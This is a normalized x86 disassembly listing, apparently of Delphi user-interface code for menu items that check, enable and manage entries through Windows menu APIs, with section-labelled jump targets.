mov eax edi
call sub_45b408
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b34
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f50
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_458f18
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041c4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b66d
lea eax [ ebp - 0x24 ]
call sub_403eb8
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_459e54
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45b698
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4042c4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f0c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45b6c0
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45b830
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45b840
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45b708
sub_45b708
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_459dc4
push eax
call CheckMenuItem
mov eax esi
call sub_45b6c0
sub_45b75c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45b830
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_459dc4
push eax
call EnableMenuItem
sub_45b7d4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45bb94
mov edx eax
mov ecx ebx
mov eax edi
call sub_459d64
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45b6c0
sub_45b840
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418700
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_458e6c
sub_45b8b0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45b830
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45b898
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45bbc8
mov ecx ebx
mov edx esi
mov eax edi
call sub_45b9bc
sub_45b8f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45b830
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45b840
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45b950
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45b830
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45b840
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45b840
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45b9bc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_458e6c
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_459d64
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41877c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45bc34
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45b830
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459c94
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418700
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418700
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45b7d4
sub_45ba70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_458e6c
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45b830
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459c94
mov eax ebx
call sub_45b830
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418700
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4185f0
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45bae4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45b708
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45b818
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45b818
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45bbac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b830
mov edx eax
mov ecx esi
mov eax ebx
call sub_45b9bc
pop esi
pop ebx
retn
sub_45bbc8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45bb94
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45ba70
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_458e6c
sub_45bbf0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45bc34
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45bc34
jmp r-xdata
mov eax ebx
call sub_459c94
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45d90c
sub_45bc8c
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ ebx + 0x4c ] eax
sub_45bcb4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403128
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45bf48
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403324
mov edx ebx
mov eax edi
call sub_420e08
mov eax ebx
mov si 0xffee
call sub_403324
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45bd24
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov [ esi + 0x4c ] eax
sub_45bd58
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45b830
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45b840
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45bd98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45bbc8
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45bbac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45bbac
sub_45bdfc
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45b6c0
sub_45be28
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45b698
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45b708
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45b75c
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f0c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45b888
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45b7d4
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45b864
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45b878
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45bf48
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45b818
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403324
sub_45bf6c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45bf8c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45bfac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45bfcc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45bfec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c00c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c02c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c04c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c06c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45c08c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418df8
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_455d30
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_455f18
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_455f78
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_455bc8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_456038
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45c104
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421054
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45b818
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45bcb4
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45c158
jmp r-xdata
xor edx edx
mov eax esi
call sub_459c1c
sub_45c158
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_4575f0
mov eax ebx
call sub_45c1c8
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_457634
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_420e08
sub_45c1a0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45c1a0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4592f0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45bc34
mov eax ebx
pop esi
pop ebx
retn
sub_45c1dc
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c4e0
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404418
sub_45c20c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f50
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45c290
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45c3b2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_404178
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_404178
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4043d8
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042c4
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c3b9
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404460
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404238
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_404178
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_4043d8
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404238
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45c3f0
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45c88f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f50
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45c850
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45b830
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f50
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c896
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403edc
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403edc
lea eax [ ebp - 0x18 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
call sub_45ca44
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b840
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042c4
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45c20c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45b840
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45b840
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
mov eax [ ebp - 0x20 ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
mov eax [ ebp - 0xc ]
call sub_403128
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45c20c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_404178
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45b840
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
